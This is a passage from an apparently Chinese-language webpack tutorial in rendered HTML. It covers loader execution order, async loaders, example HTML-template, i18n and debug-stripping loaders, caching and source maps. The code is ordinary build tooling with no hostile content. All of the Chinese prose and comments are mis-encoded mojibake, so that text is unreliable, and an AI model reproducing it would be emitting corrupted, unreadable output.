æ¨è</span><br><span class="hljs-comment">// ts-loader â†’ sass-loader â†’ css-loader â†’ minify-loader</span><br></code></pre></td></tr></table></figure><p>(2) é“¾å¼å¯ç»„åˆ</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// è‰¯å¥½è®¾è®¡çš„Loaderè¾“å‡ºæ ¼å¼</span><br><span class="hljs-comment">// æ–‡æœ¬Loaderï¼šè¾“å…¥/è¾“å‡ºå­—ç¬¦ä¸²</span><br><span class="hljs-comment">// JS Loaderï¼šè¾“å…¥/è¾“å‡ºJSæ¨¡å—</span><br><span class="hljs-comment">// æ–‡ä»¶Loaderï¼šè¾“å…¥/è¾“å‡ºæ–‡ä»¶è·¯å¾„</span><br><span class="hljs-comment">// æœ€åä¸€ä¸ªloaderçš„è¾“å‡ºç»“æœåº”è¯¥ä¸ºStringæˆ–Bufferç±»å‹</span><br></code></pre></td></tr></table></figure><p>(3) æ— çŠ¶æ€ï¼šä¸ä¾èµ–å…¨å±€çŠ¶æ€ï¼Œæ‰€æœ‰é…ç½®é€šè¿‡optionsä¼ é€’</p><p>(4) å¹‚ç­‰æ€§ï¼šç›¸åŒè¾“å…¥å§‹ç»ˆç›¸åŒè¾“å‡ºï¼Œé¿å…ä½¿ç”¨éšæœºå€¼</p><p><strong>é¢è¯•é‡ç‚¹è§£æ</strong></p><p>(1) Loaderä¸ºä»€ä¹ˆä»å³å‘å·¦æ‰§è¡Œï¼Ÿ</p><p>è®¾è®¡åŸç†ï¼š</p><ol><li>å‡½æ•°ç»„åˆåŸç†ï¼š<code>compose(f, g)(x) = f(g(x))</code></li><li>ç®¡é“æ¨¡å‹ï¼šè¾“å‡ºä½œä¸ºä¸‹ä¸€ä¸ªLoaderè¾“å…¥</li><li>ç¬¦åˆç›´è§‰é¡ºåºï¼šåŸå§‹æ–‡ä»¶ â†’ ç¼–è¯‘ â†’ å¤„ç† â†’ è¾“å‡º</li></ol><p>(2) å¦‚ä½•æ§åˆ¶Loaderæ‰§è¡Œé¡ºåºï¼Ÿ</p><p>è§£å†³æ–¹æ¡ˆï¼š</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// æ–¹æ³•1ï¼šé…ç½®æ•°ç»„é¡ºåº</span><br><span class="hljs-attr">use</span>: [first, second, third] <span class="hljs-comment">// third â†’ second â†’ first</span><br><br><span class="hljs-comment">// æ–¹æ³•2ï¼šenforceå¼ºåˆ¶æ’åº</span><br><span class="hljs-attr">enforce</span>: <span class="hljs-string">&#x27;pre&#x27;</span> <span class="hljs-comment">// æœ€å…ˆæ‰§è¡Œ</span><br><span class="hljs-attr">enforce</span>: <span class="hljs-string">&#x27;post&#x27;</span> <span class="hljs-comment">// æœ€åæ‰§è¡Œ</span><br><br><span class="hljs-comment">// æ–¹æ³•3ï¼šruleé¡ºåºï¼ˆåŒä¼˜å…ˆçº§ï¼‰</span><br><span class="hljs-comment">// åå®šä¹‰çš„ruleå…ˆæ‰§è¡Œï¼ˆä»ä¸‹å¾€ä¸Šï¼‰</span><br></code></pre></td></tr></table></figure><p>(3) Loaderå¯ä»¥å¼‚æ­¥æ‰§è¡Œå—ï¼Ÿ</p><p>å®ç°æ–¹å¼ï¼š</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// æ–¹å¼1ï¼šè¿”å›Promise</span><br><span class="hljs-variable language_">module</span>.<span class="hljs-property">exports</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params">source</span>) &#123;<br>  <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Promise</span>(<span class="hljs-function">(<span class="hljs-params">resolve</span>) =&gt;</span> &#123;<br>    <span class="hljs-built_in">setTimeout</span>(<span class="hljs-function">() =&gt;</span> <span class="hljs-title function_">resolve</span>(source), <span class="hljs-number">100</span>);<br>  &#125;);<br>&#125;<br><br><span class="hljs-comment">// æ–¹å¼2ï¼šä½¿ç”¨this.async()</span><br><span class="hljs-variable language_">module</span>.<span class="hljs-property">exports</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params">source</span>) &#123;<br>  <span class="hljs-keyword">const</span> callback = <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">async</span>();<br>  <span class="hljs-title function_">asyncProcess</span>(source, callback);<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="2-1-2-æ‰‹å†™Loaderï¼ˆä»£ç è½¬æ¢-å›½é™…åŒ–å¤„ç†æ¡ˆä¾‹ï¼‰"><a href="#2-1-2-æ‰‹å†™Loaderï¼ˆä»£ç è½¬æ¢-å›½é™…åŒ–å¤„ç†æ¡ˆä¾‹ï¼‰" class="headerlink" title="2.1.2 æ‰‹å†™Loaderï¼ˆä»£ç è½¬æ¢&#x2F;å›½é™…åŒ–å¤„ç†æ¡ˆä¾‹ï¼‰"></a>2.1.2 æ‰‹å†™Loaderï¼ˆä»£ç è½¬æ¢&#x2F;å›½é™…åŒ–å¤„ç†æ¡ˆä¾‹ï¼‰</h3><p><strong>Loader å¼€å‘åŸºç¡€</strong></p><p>Loader æ ¸å¿ƒç»“æ„ï¼š</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// loaderåŸºæœ¬æ¨¡æ¿</span><br><span class="hljs-variable language_">module</span>.<span class="hljs-property">exports</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params">source, sourceMap, meta</span>) &#123;<br>  <span class="hljs-comment">// 1. è·å–é…ç½®é€‰é¡¹</span><br>  <span class="hljs-keyword">const</span> options = <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">getOptions</span>() || &#123;&#125;;<br>  <br>  <span class="hljs-comment">// 2. å¤„ç†æºä»£ç </span><br>  <span class="hljs-keyword">const</span> result = <span class="hljs-title function_">transform</span>(source, options);<br>  <br>  <span class="hljs-comment">// 3. è¿”å›å¤„ç†ç»“æœ</span><br>  <span class="hljs-keyword">return</span> result;<br>  <br>  <span class="hljs-comment">// æˆ–è¿”å›å¤šä¸ªå€¼</span><br>  <span class="hljs-comment">// this.callback(null, result, sourceMap, meta);</span><br>&#125;;<br></code></pre></td></tr></table></figure><p><strong>ä»£ç è½¬æ¢æ¡ˆä¾‹ï¼šHTML æ¨¡æ¿å¤„ç†</strong></p><p>(1) éœ€æ±‚åœºæ™¯</p><ul><li>å°† HTML ä¸­çš„ &lt;%&#x3D; variable %&gt; æ›¿æ¢ä¸º JS å˜é‡</li><li>æ”¯æŒæ¡ä»¶è¯­å¥ &lt;% if(cond) { %&gt;</li><li>è¾“å‡ºå¯æ‰§è¡Œ JS å‡½æ•°</li></ul><p>(2) å®Œæ•´å®ç°</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// html-template-loader.js</span><br><span class="hljs-keyword">const</span> &#123; compile &#125; = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;html-template-tag&#x27;</span>);<br><br><span class="hljs-variable language_">module</span>.<span class="hljs-property">exports</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params">source</span>) &#123;<br>  <span class="hljs-comment">// 1. æå–æ¨¡æ¿å˜é‡</span><br>  <span class="hljs-keyword">const</span> variableRegex = <span class="hljs-regexp">/&lt;%=\s*([a-zA-Z_$][\w$]*)\s*%&gt;/g</span>;<br>  <span class="hljs-keyword">const</span> variables = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Set</span>();<br>  <span class="hljs-keyword">let</span> match;<br>  <br>  <span class="hljs-keyword">while</span> ((match = variableRegex.<span class="hljs-title function_">exec</span>(source)) !== <span class="hljs-literal">null</span>) &#123;<br>    variables.<span class="hljs-title function_">add</span>(match[<span class="hljs-number">1</span>]);<br>  &#125;<br>  <br>  <span class="hljs-comment">// 2. ç”Ÿæˆå‡½æ•°å‚æ•°</span><br>  <span class="hljs-keyword">const</span> params = <span class="hljs-title class_">Array</span>.<span class="hljs-title function_">from</span>(variables).<span class="hljs-title function_">join</span>(<span class="hljs-string">&#x27;, &#x27;</span>);<br>  <br>  <span class="hljs-comment">// 3. ç¼–è¯‘ä¸ºæ¨¡æ¿å‡½æ•°</span><br>  <span class="hljs-keyword">const</span> templateCode = <span class="hljs-title function_">compile</span>(source);<br>  <br>  <span class="hljs-comment">// 4. ç”Ÿæˆæœ€ç»ˆå‡½æ•°</span><br>  <span class="hljs-keyword">const</span> output = <span class="hljs-string">`</span><br><span class="hljs-string">    export default function render(<span class="hljs-subst">$&#123;params&#125;</span>) &#123;</span><br><span class="hljs-string">      return \`<span class="hljs-subst">$&#123;templateCode&#125;</span>\`;</span><br><span class="hljs-string">    &#125;</span><br><span class="hljs-string">  `</span>;<br>  <br>  <span class="hljs-keyword">return</span> output;<br>&#125;;<br></code></pre></td></tr></table></figure><p>(3) ä½¿ç”¨ç¤ºä¾‹</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// webpacké…ç½®</span><br><span class="hljs-attr">module</span>: &#123;<br>  <span class="hljs-attr">rules</span>: [<br>    &#123;<br>      <span class="hljs-attr">test</span>: <span class="hljs-regexp">/\.html$/</span>,<br>      <span class="hljs-attr">use</span>: &#123;<br>        <span class="hljs-attr">loader</span>: path.<span class="hljs-title function_">resolve</span>(__dirname, <span class="hljs-string">&#x27;html-template-loader.js&#x27;</span>)<br>      &#125;<br>    &#125;<br>  ]<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>å›½é™…åŒ–å¤„ç†æ¡ˆä¾‹ï¼ši18n æ–‡æœ¬æ›¿æ¢</strong></p><p>(1) éœ€æ±‚åœºæ™¯</p><ul><li>æå–ä»£ç ä¸­çš„ __(â€œkeyâ€) è°ƒç”¨</li><li>æ ¹æ®è¯­è¨€é…ç½®æ›¿æ¢ä¸ºå¯¹åº”æ–‡æœ¬</li><li>æ”¯æŒåŠ¨æ€æ’å€¼ __(â€œwelcomeâ€, { name: user })</li></ul><p>(2) å®Œæ•´å®ç°</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// i18n-loader.js</span><br><span class="hljs-keyword">const</span> &#123; transform &#125; = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;@babel/core&#x27;</span>);<br><span class="hljs-keyword">const</span> parser = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;@babel/parser&#x27;</span>);<br><span class="hljs-keyword">const</span> traverse = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;@babel/traverse&#x27;</span>).<span class="hljs-property">default</span>;<br><span class="hljs-keyword">const</span> generate = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;@babel/generator&#x27;</span>).<span class="hljs-property">default</span>;<br><span class="hljs-keyword">const</span> t = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;@babel/types&#x27;</span>);<br><br><span class="hljs-variable language_">module</span>.<span class="hljs-property">exports</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params">source</span>) &#123;<br>  <span class="hljs-keyword">const</span> options = <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">getOptions</span>();<br>  <span class="hljs-keyword">const</span> locale = options.<span class="hljs-property">locale</span> || <span class="hljs-string">&#x27;en&#x27;</span>;<br>  <span class="hljs-keyword">const</span> messages = options.<span class="hljs-property">messages</span> || &#123;&#125;;<br>  <br>  <span class="hljs-comment">// è§£æAST</span><br>  <span class="hljs-keyword">const</span> ast = parser.<span class="hljs-title function_">parse</span>(source, &#123;<br>    <span class="hljs-attr">sourceType</span>: <span class="hljs-string">&#x27;module&#x27;</span>,<br>    <span class="hljs-attr">plugins</span>: [<span class="hljs-string">&#x27;jsx&#x27;</span>]<br>  &#125;);<br>  <br>  <span class="hljs-comment">// éå†ASTæŸ¥æ‰¾__()è°ƒç”¨</span><br>  <span class="hljs-title function_">traverse</span>(ast, &#123;<br>    <span class="hljs-title class_">CallExpression</span>(path) &#123;<br>      <span class="hljs-keyword">if</span> (t.<span class="hljs-title function_">isIdentifier</span>(path.<span class="hljs-property">node</span>.<span class="hljs-property">callee</span>, &#123; <span class="hljs-attr">name</span>: <span class="hljs-string">&#x27;__&#x27;</span> &#125;)) &#123;<br>        <span class="hljs-keyword">const</span> args = path.<span class="hljs-property">node</span>.<span class="hljs-property">arguments</span>;<br>        <br>        <span class="hljs-comment">// éªŒè¯ç¬¬ä¸€ä¸ªå‚æ•°æ˜¯å­—ç¬¦ä¸²</span><br>        <span class="hljs-keyword">if</span> (args.<span class="hljs-property">length</span> &gt; <span class="hljs-number">0</span> &amp;&amp; t.<span class="hljs-title function_">isStringLiteral</span>(args[<span class="hljs-number">0</span>])) &#123;<br>          <span class="hljs-keyword">const</span> key = args[<span class="hljs-number">0</span>].<span class="hljs-property">value</span>;<br>          <br>          <span class="hljs-comment">// è·å–ç¿»è¯‘æ–‡æœ¬</span><br>          <span class="hljs-keyword">const</span> translation = messages[locale]?.[key] || key;<br>          <br>          <span class="hljs-comment">// å¤„ç†æ’å€¼</span><br>          <span class="hljs-keyword">if</span> (args.<span class="hljs-property">length</span> &gt; <span class="hljs-number">1</span> &amp;&amp; t.<span class="hljs-title function_">isObjectExpression</span>(args[<span class="hljs-number">1</span>])) &#123;<br>            <span class="hljs-keyword">const</span> props = args[<span class="hljs-number">1</span>].<span class="hljs-property">properties</span>;<br>            <span class="hljs-keyword">let</span> template = translation;<br>            <br>            props.<span class="hljs-title function_">forEach</span>(<span class="hljs-function"><span class="hljs-params">prop</span> =&gt;</span> &#123;<br>              <span class="hljs-keyword">const</span> varName = prop.<span class="hljs-property">key</span>.<span class="hljs-property">name</span>;<br>              template = template.<span class="hljs-title function_">replace</span>(<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">RegExp</span>(<span class="hljs-string">`\\&#123;<span class="hljs-subst">$&#123;varName&#125;</span>\\&#125;`</span>, <span class="hljs-string">&#x27;g&#x27;</span>),<br>                <span class="hljs-string">`\$&#123;<span class="hljs-subst">$&#123;varName&#125;</span>&#125;`</span><br>              );<br>            &#125;);<br>            <br>            <span class="hljs-comment">// æ›¿æ¢ä¸ºæ¨¡æ¿å­—ç¬¦ä¸²</span><br>            path.<span class="hljs-title function_">replaceWith</span>(t.<span class="hljs-title function_">templateLiteral</span>(<br>              [t.<span class="hljs-title function_">templateElement</span>(&#123; <span class="hljs-attr">raw</span>: template, <span class="hljs-attr">cooked</span>: template &#125;)],<br>              props.<span class="hljs-title function_">map</span>(<span class="hljs-function"><span class="hljs-params">prop</span> =&gt;</span> t.<span class="hljs-title function_">identifier</span>(prop.<span class="hljs-property">key</span>.<span class="hljs-property">name</span>))<br>            ));<br>          &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-comment">// ç›´æ¥æ›¿æ¢ä¸ºæ–‡æœ¬</span><br>            path.<span class="hljs-title function_">replaceWith</span>(t.<span class="hljs-title function_">stringLiteral</span>(translation));<br>          &#125;<br>        &#125;<br>      &#125;<br>    &#125;<br>  &#125;);<br>  <br>  <span class="hljs-comment">// ç”Ÿæˆä»£ç </span><br>  <span class="hljs-keyword">return</span> <span class="hljs-title function_">generate</span>(ast).<span class="hljs-property">code</span>;<br>&#125;;<br></code></pre></td></tr></table></figure><p>(3) é…ç½®ç¤ºä¾‹</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// webpack.config.js</span><br><span class="hljs-variable language_">module</span>.<span class="hljs-property">exports</span> = &#123;<br>  <span class="hljs-attr">module</span>: &#123;<br>    <span class="hljs-attr">rules</span>: [<br>      &#123;<br>        <span class="hljs-attr">test</span>: <span class="hljs-regexp">/\.jsx?$/</span>,<br>        <span class="hljs-attr">use</span>: &#123;<br>          <span class="hljs-attr">loader</span>: path.<span class="hljs-title function_">resolve</span>(__dirname, <span class="hljs-string">&#x27;i18n-loader.js&#x27;</span>),<br>          <span class="hljs-attr">options</span>: &#123;<br>            <span class="hljs-attr">locale</span>: <span class="hljs-string">&#x27;zh-CN&#x27;</span>,<br>            <span class="hljs-attr">messages</span>: &#123;<br>              <span class="hljs-string">&#x27;zh-CN&#x27;</span>: &#123;<br>                <span class="hljs-string">&#x27;welcome&#x27;</span>: <span class="hljs-string">&#x27;æ¬¢è¿ï¼Œ&#123;name&#125;ï¼&#x27;</span>,<br>                <span class="hljs-string">&#x27;logout&#x27;</span>: <span class="hljs-string">&#x27;é€€å‡ºç™»å½•&#x27;</span><br>              &#125;,<br>              <span class="hljs-attr">en</span>: &#123;<br>                <span class="hljs-string">&#x27;welcome&#x27;</span>: <span class="hljs-string">&#x27;Welcome, &#123;name&#125;!&#x27;</span>,<br>                <span class="hljs-string">&#x27;logout&#x27;</span>: <span class="hljs-string">&#x27;Logout&#x27;</span><br>              &#125;<br>            &#125;<br>          &#125;<br>        &#125;<br>      &#125;<br>    ]<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>Loader é«˜çº§åŠŸèƒ½å®ç°</strong></p><p>(1) ç¼“å­˜ä¸æ€§èƒ½ä¼˜åŒ–</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-variable language_">module</span>.<span class="hljs-property">exports</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params">source</span>) &#123;<br>  <span class="hljs-comment">// å¯ç”¨ç¼“å­˜</span><br>  <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">this</span>.<span class="hljs-property">cacheable</span>) <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">cacheable</span>();<br>  <br>  <span class="hljs-comment">// æ·»åŠ æ–‡ä»¶ä¾èµ–</span><br>  <span class="hljs-keyword">const</span> i18nFile = path.<span class="hljs-title function_">resolve</span>(__dirname, <span class="hljs-string">&#x27;locales.json&#x27;</span>);<br>  <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">addDependency</span>(i18nFile);<br>  <br>  <span class="hljs-comment">// å¼‚æ­¥å¤„ç†</span><br>  <span class="hljs-keyword">const</span> callback = <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">async</span>();<br>  <br>  fs.<span class="hljs-title function_">readFile</span>(i18nFile, <span class="hljs-string">&#x27;utf-8&#x27;</span>, <span class="hljs-function">(<span class="hljs-params">err, data</span>) =&gt;</span> &#123;<br>    <span class="hljs-keyword">if</span> (err) <span class="hljs-keyword">return</span> <span class="hljs-title function_">callback</span>(err);<br>    <br>    <span class="hljs-keyword">const</span> messages = <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">parse</span>(data);<br>    <span class="hljs-keyword">const</span> result = <span class="hljs-title function_">process</span>(source, messages);<br>    <br>    <span class="hljs-title function_">callback</span>(<span class="hljs-literal">null</span>, result);<br>  &#125;);<br>&#125;;<br></code></pre></td></tr></table></figure><p>(2) Source Map æ”¯æŒ</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-variable language_">module</span>.<span class="hljs-property">exports</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params">source, sourceMap</span>) &#123;<br>  <span class="hljs-comment">// ç”Ÿæˆæ–°Source Map</span><br>  <span class="hljs-keyword">const</span> result = <span class="hljs-title function_">transform</span>(source);<br>  <br>  <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">callback</span>(<span class="hljs-literal">null</span>, result.<span class="hljs-property">code</span>, result.<span class="hljs-property">map</span>);<br>&#125;;<br></code></pre></td></tr></table></figure><p><strong>ä¼ä¸šçº§æ¡ˆä¾‹ï¼šå®‰å…¨è¿‡æ»¤Loader</strong></p><p>(1) éœ€æ±‚åœºæ™¯</p><ul><li>è¿‡æ»¤ç”Ÿäº§ç¯å¢ƒä¸­çš„è°ƒè¯•ä»£ç </li><li>ç§»é™¤ console.debug è°ƒç”¨</li><li>åˆ é™¤ @test-only æ ‡è®°çš„ä»£ç å—</li></ul><p>(2) å®Œæ•´å®ç°</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// secure-loader.js</span><br><span class="hljs-keyword">const</span> parser = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;@babel/parser&#x27;</span>);<br><span class="hljs-keyword">const</span> traverse = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;@babel/traverse&#x27;</span>).<span class="hljs-property">default</span>;<br><span class="hljs-keyword">const</span> generate = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;@babel/generator&#x27;</span>).<span class="hljs-property">default</span>;<br><span class="hljs-keyword">const</span> t = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;@babel/types&#x27;</span>);<br><br><span class="hljs-variable language_">module</span>.<span class="hljs-property">exports</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params">source</span>) &#123;<br>  <span class="hljs-comment">// ä»…åœ¨ç”Ÿäº§ç¯å¢ƒå¯ç”¨</span><br>  <span class="hljs-keyword">if</span> (process.<span class="hljs-property">env</span>.<span class="hljs-property">NODE_ENV</span> !== <span class="hljs-string">&#x27;production&#x27;</span>) &#123;<br>    <span class="hljs-keyword">return</span> source;<br>  &#125;<br><br>  <span class="hljs-keyword">const</span> ast = parser.<span class="hljs-title function_">parse</span>(source, &#123;<br>    <span class="hljs-attr">sourceType</span>: <span class="hljs-string">&#x27;module&#x27;</span>,<br>    <span class="hljs-attr">plugins</span>: [<span class="hljs-string">&#x27;jsx&#x27;</span>, <span class="hljs-string">&#x27;typescript&#x27;</span>]<br>  &#125;);<br><br>  <span class="hljs-title function_">traverse</span>(ast, &#123;<br>    <span class="hljs-comment">// ç§»é™¤console.debug</span><br>    <span class="hljs-title class_">CallExpression</span>(path) &#123;<br>      <span class="hljs-keyword">if</span> (t.<span class="hljs-title function_">isMemberExpression</span>(path.<span class="hljs-property">node</span>.<span class="hljs-property">callee</span>) &amp;&amp;<br>          t.<span class="hljs-title function_">isIdentifier</span>(path.<span class="hljs-property">node</span>.<span class="hljs-property">callee</span>.<span class="hljs-property">object</span>, &#123; <span class="hljs-attr">name</span>: <span class="hljs-string">&#x27;console&#x27;</span> &#125;) &amp;&amp;<br>          t.<span class="hljs-title function_">isIdentifier</span>(path.<span class="hljs-property">node</span>.<span class="hljs-property">callee</span>.<span class="hljs-property">property</span>, &#123; <span class="hljs-attr">name</span>: <span class="hljs-string">&#x27;debug&#x27;</span> &#125;)) &#123;<br>        path.<span class="hljs-title function_">remove</span>();<br>      &#125;<br>    &#125;,<br>    <br>    <span class="hljs-comment">// ç§»é™¤@test-onlyæ ‡è®°ä»£ç å—</span><br>    <span class="hljs-title class_">BlockStatement</span>(path) &#123;<br>      <span class="hljs-keyword">const</span> comments = path.<span class="hljs-property">node</span>.<span class="hljs-property">innerComments</span> || [];<br>      <span class="hljs-keyword">if</span> (comments.<span class="hljs-title function_">some</span>(<span class="hljs-function"><span class="hljs-params">c</span> =&gt;</span> c.<span class="hljs-property">value</span>.<span class="hljs-title function_">includes</span>(<span class="hljs-string">&#x27;@test-only&#x27;</span>))) &#123;<br>        path.<span class="hljs-title function_">remove</span>();<br>      &#125;<br>    &#125;,<br>    <br>    <span class="hljs-comment">// ç§»é™¤debuggerè¯­å¥</span><br>    <span class="hljs-title class_">DebuggerStatement</span>(path) &#123;<br>      path.<span class="hljs-title function_">remove</span>();<br>    &#125;<br>  &#125;);<br><br>  <span class="hljs-keyword">return</span> <span class="hljs-title function_">generate</span>(ast).<span class="hljs-property">code</span>;<br>&#125;;<br></code></pre></td></tr></table></figure><h3 id="2-1-3-æ€§èƒ½ä¼˜åŒ–ï¼šLoaderç¼“å­˜ã€å¤šè¿›ç¨‹ç¼–è¯‘ï¼ˆthread-loaderï¼‰"><a href="#2-1-3-æ€§èƒ½ä¼˜åŒ–ï¼šLoaderç¼“å­˜ã€å¤šè¿›ç¨‹ç¼–è¯‘ï¼ˆthread-loaderï¼‰" class="headerlink" title="2.1.3 æ€§èƒ½ä¼˜åŒ–ï¼šLoaderç¼“å­˜ã€å¤šè¿›ç¨‹ç¼–è¯‘ï¼ˆthread-loaderï¼‰"></a>2.1.3 